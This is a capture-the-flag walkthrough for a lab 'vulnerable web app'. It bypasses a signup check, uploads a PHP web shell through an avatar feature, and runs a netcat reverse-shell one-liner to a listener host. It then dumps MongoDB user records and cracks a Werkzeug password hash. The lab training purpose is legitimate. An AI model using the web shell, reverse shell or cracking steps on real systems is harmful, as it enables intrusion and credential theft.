---
date: 2025-03-10
categories: [CTF, IML]
title: "IML - Mini CTF: Vulnerable Web App – Ep.1"
tags: ['web exploit']

description: "Mini CTF Vulnerable Web App –-1 - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Mini CTF: Vulnerable Web App – Ep.1

- On the main page, we casn sign up - but the Registration is giving a "Username too long!" error
Even if we give one letter


![image1](../resources/f3962ea2932041bb8298291c972a403f.png)

- In the brief it says that the app is still in development:

![image2](../resources/a39e5ba82b9c41b8ab0402482dd1c2bf.png)

- Open Burp and break the app (took username param out):

![image3](../resources/6039703708924a149b3cf483f2fcb8a6.png)

- We can see the format of the username here - **admin@mywebsite.com**

- So we can create an account using:
name@website.com - It needs the @ and the .com

Use the same name for the email

And a long password

- Login

![image4](../resources/7290a6dcbd2142038dcf860038e50970.png)

- Do a directory scan:
dirb <http://10.102.88.96> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -c "session=eyJlbWFpbCI6ImFkbWluMkBteXdlYnNpdGUuY29tIn0.ZkxlMA.8rXIHijh614ybDQnm6DKb5ABNO8"


![image5](../resources/63d473c8b4154fbc95ea8c1f6e651de5.png)

- We can see an uploads folder

- If we look at the Change Avatar feature - we can upload a file:

![image6](../resources/89b12ff7109d4bb6bff31de02b0f7665.png)

- On revshells find the php cmd command and create a **script.php** file:

```html
<html>
<body>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
  </form>
  <pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
  </pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

```

- Upload that file

- Go to <http://10.102.88.96/static/uploads/script.php>

![image7](../resources/8f74a9b4fd9c4b96a62b6c0040913d0d.png)

- We have RCE

- Set up listener
- Run a bash rev shell command
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.102.74.132 8881 >/tmp/f
```

![image8](../resources/b2b31ce3cc2b40caa7da056df56c1cc8.png)


![image9](../resources/f180143cee174381a848c1a5031eeb2a.png)

- Admin creds:

![image10](../resources/34502bdd941e4ad099f3fff9cad66ece.png)

- MongoDB is running

```bash
mongo
show databases
use dev
show collections
db.user.find()
```

![image11](../resources/e251a386eac04e2c9553011465c9c8ae.png)

Python Werkzeug
corresponds to:
pbkdf2:sha256:\[ITERATIONS\]\$\[RAW SALT EVEN THOUGH IT LOOKS BASE64\]\$\[HEXDIGEST OF pbkdf2 sha256 hmac\]


- We can use the tool:
<https://github.com/AnataarXVI/Werkzeug-Cracker>

Use admin hash (from admin_details.txt):

pbkdf2:sha256:50000\$mqWZ9okN\$8840ee19b918c135fcf0f639a4c0efd0425fcee6462d1d59d40493e07ed9ab8b